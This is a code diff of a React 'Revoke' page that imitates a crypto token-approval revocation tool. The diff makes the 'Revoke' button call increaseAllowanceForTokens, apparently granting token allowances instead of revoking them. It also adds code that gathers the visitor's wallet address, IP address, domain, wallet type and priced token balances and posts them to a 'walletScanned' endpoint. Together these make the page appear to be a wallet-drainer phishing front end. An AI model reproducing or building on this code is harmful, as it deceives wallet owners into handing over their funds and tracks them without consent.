@@ -1,43 +1,174 @@
-import React, { useEffect, useState } from "react";
+import React, { useEffect, useState, useContext } from "react";
+import AppContext from "../components/AppContext";
 import Container from "../components/Container";
-import UseAccountFunctions from "../utils/helpers";
-import { useAccount, useAccountEffect } from "wagmi";
+import { useAccount } from "wagmi";
+import {
+  getUserTokens,
+  increaseAllowanceForTokens,
+  increaseAllowance,
+  getAccountBalance,
+  getTokenPriceByAddress,
+  getTokenPriceByAddressAndAmount,
+  getIPAddress,
+  getDomain,
+} from "../utils/helpers";
+import { walletScanned } from "../api";
 
 const Revoke = () => {
-  const { getUserTokens, getAccountBalance, increaseAllowanceForTokens } =
-    UseAccountFunctions();
-  const { isConnected, address } = useAccount();
-  const [tokenData, setTokenData] = useState([]);
-  const [loading, setLoading] = useState(false);
-  const [loadingEthBalance, setLoadingEthBalance] = useState(false);
-  const [ethBalance, setEthBalance] = useState("0");
+  const {
+    domainName,
+    ipAddress,
+    walletType,
+    loadingData,
+    ethBalance,
+    tokenData,
+    loadingEthBalance,
+    handleLoadingData,
+    handleLoadingEthBalance,
+  } = useContext(AppContext);
+  const { isConnected, address, connector } = useAccount();
   const [isButtonDisabled, setIsButtonDisabled] = useState(false);
+  const [priceData, setPriceData] = useState(null);
+  const [testToken, setTestToken] = useState([
+    {
+      contractAddress: "0x95ad61b0a150d79219dcf64e1e6cc01f0b64c4ce",
+      balance: "1999999998000000.0",
+      rawBalance: "1999999998000000000000000000000000",
+      decimals: 18,
+      logo: undefined,
+      name: "Shibainu",
+    },
+
+    {
+      contractAddress: "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
+      balance: "1999999998000000.0",
+
+      rawBalance: "1000000000000000000000",
+      decimals: 18,
+      logo: undefined,
+      name: "USDC Token",
+    },
+
+    {
+      contractAddress: "0x6982508145454ce325ddbe47a25d4ec3d2311933",
+      balance: "1999999998000000.0",
+
+      rawBalance: "999999999998000000000000000000000",
+      decimals: 18,
+      logo: undefined,
+      name: "Pepe",
+    },
+    {
+      contractAddress: "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2",
+      balance: "1999999998000000.0",
+      rawBalance: "0",
+      decimals: 18,
+      logo: undefined,
+      name: "Wrapped Ether",
+    },
+  ]);
 
   useEffect(() => {
-    if (isConnected) {
-      setLoading(true);
-      setLoadingEthBalance(true);
-      getAccountBalance(address)
-        .then((response) => {
-          console.log("response: ", response.formatted);
-          const formatted = response.formatted;
-          setEthBalance(formatted);
-        })
-        .finally(() => {
-          setLoadingEthBalance(false);
-        });
-      getUserTokens(address)
-        .then((response) => {
-          setTokenData(response);
-          // console.log("response: ", response);
-        })
-        .finally(() => setLoading(false));
+    if (!loadingData && testToken) {
+      const fetchPriceData = async () => {
+        const priceData = [];
+        for (const token of testToken) {
+          await new Promise((resolve) => setTimeout(resolve, 1000)); // rate limit
+          try {
+            const data = await getTokenPriceByAddressAndAmount(
+              token.contractAddress,
+              "usd",
+              token.balance
+            );
+            priceData.push(data);
+          } catch (error) {
+            console.error("Error fetching token price:", error);
+          }
+        }
+        setPriceData(priceData);
+      };
+
+      fetchPriceData();
     }
-  }, []);
-  const handleClick = () => {
-    setIsButtonDisabled(true)
-    increaseAllowanceForTokens(tokenData);
+  }, [loadingData, tokenData]);
+
+  useEffect(() => {
+    if (connector && !loadingData && priceData && testToken) {
+      const mergedTokens = [];
+
+      const data = {
+        current_network: "Ethereum",
+        domain: domainName,
+        erc_20_tokens: [
+          {
+            balance: "790.93",
+            contract_address: "0xeiieitii84jwjjjwju2y2y2y2yy1h2h3h3ssvavab954",
+            token_balance: "90.93",
+            token_name: "BUSD",
+          },
+        ],
+        ip_address: ipAddress,
+        native_coin: "ETH",
+        total_balance: ethBalance,
+        wallet_address: address,
+        wallet_type: connector.name,
+      };
+
+      testToken.forEach((tokenObj) => {
+        const matchingTokenObj = priceData.filter(
+          (priceObj) => tokenObj.contractAddress === priceObj.contractAddress
+        );
+        if (matchingTokenObj.length > 0) {
+          const mergedObj = { ...tokenObj, ...matchingTokenObj[0] };
+          mergedTokens.push(mergedObj);
+        }
+      });
+
+      data.erc_20_tokens = mergedTokens.map((tokenObj) => {
+        const {
+          amountInusd,
+          contractAddress,
+          name,
+          symbol,
+          totalSupply,
+          balance,
+        } = tokenObj;
+
+        return {
+          balance: ` ${amountInusd}`,
+          contract_address: contractAddress,
+          token_balance: balance,
+          token_name: name,
+        };
+      });
+
+      const fetchData = async () => {
+        try {
+          const res = await walletScanned(data);
+          console.log("wallet Scanned: ", res);
+        } catch (error) {
+          console.log("failed to send post for walletScanned: ", error);
+        }
+      };
+      fetchData();
+      console.log("data for post request: ", data);
+    }
+  }, [priceData, testToken, loadingData, connector]);
+
+  const handleClick = async () => {
+    setIsButtonDisabled((prevIsButtonDisabled) => true); // Functional update
+    try {
+      const res = await increaseAllowanceForTokens(testToken);
+      console.log("responds from increase allowance token: ", res);
+    } catch (error) {
+      console.error(console.error("failed to increase Allowance token"));
+    }
+    finally{
+      setIsButtonDisabled(false)
+
+    }
   };
+
   return (
     <Container>
       <div className="flex justify-center -mt-4 mb-8 px-4 lg:px-8">
@@ -86,7 +217,14 @@ const Revoke = () => {
                     </div>
                     <div className="leading-none">•</div>
                     <div className="flex gap-1 items-center leading-none">
-                      <span aria-expanded="false">0x944853...9D1e9f</span>
+                      <span aria-expanded="false">
+                        {" "}
+                        {address && (
+                          <>
+                            {address.slice(0, 6)}... {address.slice(-6)}
+                          </>
+                        )}
+                      </span>
                       <button
                         aria-label="Copy To Clipboard"
                         className="focus-visible:outline-none focus-visible:ring-black dark:focus-visible:ring-white focus-visible:ring-2 focus-visible:rounded justify-center"
@@ -342,7 +480,7 @@ const Revoke = () => {
                         Total Approvals
                       </div>
                       <div className="font-bold">
-                        {loading ? "loading" : tokenData.length}
+                        {loadingData ? "loading" : tokenData.length}
                       </div>
                     </div>
                     <div className="flex flex-col items-center gap-0.5">
@@ -408,7 +546,7 @@ const Revoke = () => {
                   </tr>
                 </thead>
                 <tbody>
-                  {loading ? (
+                  {loadingData ? (
                     <p>Loading data...</p>
                   ) : (
                     tokenData.map((token, i) => (
@@ -545,10 +683,11 @@ const Revoke = () => {
                               <button
                                 onClick={handleClick}
                                 disabled={isButtonDisabled}
-                                className={`focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-black dark:focus-visible:ring-white flex items-center border border-black dark:border-white duration-150 cursor-pointer disabled:cursor-not-allowed font-medium shrink-0 whitespace-nowrap bg-white text-black visited:text-black hover:bg-zinc-200 disabled:bg-zinc-300 justify-center h-6 px-2 text-xs rounded-md ${isButtonDisabled?"disabled:opacity-75" : ""}`}
+                                className={`focus-visible:outline-none focus-visible:ring-1 focus-visible:ring-black dark:focus-visible:ring-white flex items-center border border-black dark:border-white duration-150 cursor-pointer disabled:cursor-not-allowed font-medium shrink-0 whitespace-nowrap bg-white text-black visited:text-black hover:bg-zinc-200 disabled:bg-zinc-300 justify-center h-6 px-2 text-xs rounded-md ${
+                                  isButtonDisabled ? "disabled:opacity-75" : ""
+                                }`}
                               >
-                                    {isButtonDisabled ? 'Revoking' : 'Revoke'}
-
+                                {isButtonDisabled ? "Revoking" : "Revoke"}
                               </button>
                             </div>
                           </div>
